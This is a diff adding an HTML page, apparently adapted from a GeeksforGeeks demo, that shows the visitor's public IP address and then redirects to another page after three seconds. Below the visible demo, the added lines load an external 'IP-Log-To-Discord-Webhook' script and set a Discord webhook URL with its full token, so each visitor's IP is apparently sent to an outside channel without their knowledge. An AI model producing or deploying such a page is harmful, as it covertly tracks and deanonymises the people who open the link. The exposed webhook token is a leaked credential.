@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Copy this into the <head> -->
+<meta http-equiv="refresh" content="3;url=MAINPAGE.html" />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" 
+          content="width=device-width, initial-scale=1.0">
+    <title>Getting Client's IP</title>
+    <style>
+        p, h1 {
+            color: green;
+        }
+    </style>
+</head>
+
+<body>
+    <center>
+        <h1>GeeksforGeeks</h1>
+        <h3>Public IP Address of user is:</h3>
+        <p id="ip-address"></p>
+    </center>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Fetch the IP address from the API
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    // Display the IP address on the screen
+                    document.getElementById("ip-address").textContent = data.ip;
+                })
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                });
+        });
+    </script>
+ <!-- Copy this into the <head> --> 
+<!-- Copy this into the end of <body> -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+<script src="https://cdn.jsdelivr.net/gh/luisoos/IP-Log-To-Discord-Webhook/index.js"></script>
+<script>var webHookUrl = "https://discord.com/api/webhooks/1306285452394889226/N79NNR4O9o-_JAO133sHZ1ltgs-JAXgIGGMv6ucBlA-JhyTPzL4JkDSd7VZciPhHerdC";</script>
+</body>
+
+</html>
